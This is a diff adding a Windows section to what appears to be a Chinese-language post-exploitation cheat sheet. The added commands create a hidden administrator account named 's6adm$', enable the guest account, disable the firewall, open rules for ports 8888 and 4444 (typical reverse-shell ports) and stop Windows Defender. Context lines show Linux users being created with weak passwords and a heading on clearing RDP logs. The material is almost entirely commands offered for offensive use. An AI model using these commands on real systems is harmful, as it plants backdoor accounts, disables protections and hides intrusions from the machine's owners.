@@ -199,6 +199,41 @@ useradd -p "$(openssl passwd 123456)" guest
 useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 ```
 
+### windows
+```
+net user s6adm$ Afabab@20 /add
+net localgroup administrators s6adm$ /add
+net user guest /active:yes
+```
+
+## 防火墙
+```
+关闭防火墙
+
+netsh firewall set opmode mode=disable
+
+放行远程8888端口进来的流量
+netsh advfirewall firewall add rule name="88" protocol=TCP dir=in remoteport=8888 action=allow
+
+放行出去到远程8888端口的流量
+netsh advfirewall firewall add rule name="88" protocol=TCP dir=out remoteport=8888 action=allow
+
+放行本地4444端口出去的流量
+netsh advfirewall firewall add rule name="44" protocol=TCP dir=out localport=4444 action=allow
+
+放行从本地4444端口进来的流量
+netsh advfirewall firewall add rule name="44" protocol=TCP dir=in localport=4444 action=allow
+
+删除规则
+netsh advfirewall firewall delete rule name="88"
+
+查看防火墙配置(可看到具体规则等配置)
+netsh firewall show config
+
+关闭windefebd
+net stop windefend
+```
+
 ## 删rdp日志
 
 清除远程桌面连接记录,创建clear.bat
